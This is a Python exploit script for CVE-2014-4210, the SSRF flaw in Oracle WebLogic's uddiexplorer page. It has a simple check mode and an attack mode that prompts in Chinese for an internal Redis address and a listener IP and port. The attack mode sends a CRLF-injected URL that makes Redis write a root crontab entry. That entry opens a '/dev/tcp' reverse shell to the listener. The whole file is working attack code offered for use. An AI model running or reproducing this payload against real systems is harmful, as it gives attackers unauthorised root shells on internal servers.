#coding=utf-8
import requests
import sys

def poc(url):
    url = url + "/uddiexplorer/SearchPublicRegistries.jsp"
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.50"}
    resp = requests.get(url=url,headers=headers)
    if resp.status_code == 200:
        print("It has CVE-2014-4210")
    else:
        print("It may not have Vulnerability")

def redisAttack(url):
    try:
        redisip = input("请输入有redis服务的地址:(带端口)")
        shell = input("接受反弹shell的iP:")
        port =  input("接受反弹shell的端口:")
    except:
        print("请正确输入参数")
        exit(0)
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.50"}
    url = url + f"/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{redisip}/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{shell}%2F{port}%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa"
    requests.get(url=url,headers=headers)
    print("成功进行攻击,请测试反弹shell是否成功...")

if __name__ == '__main__':
    try:
        index = sys.argv[1]
        url = sys.argv[2]
        if index == '-s':
            poc(url)
        if index == '-a':
            redisAttack(url)
    except:
        print('''
        example: WeblogicSSRF.py [-s/-a] [url]
        s: Check CVE-2014-4210.
        a: Attack inner redis.
        url: The target you want to check.
        ''')



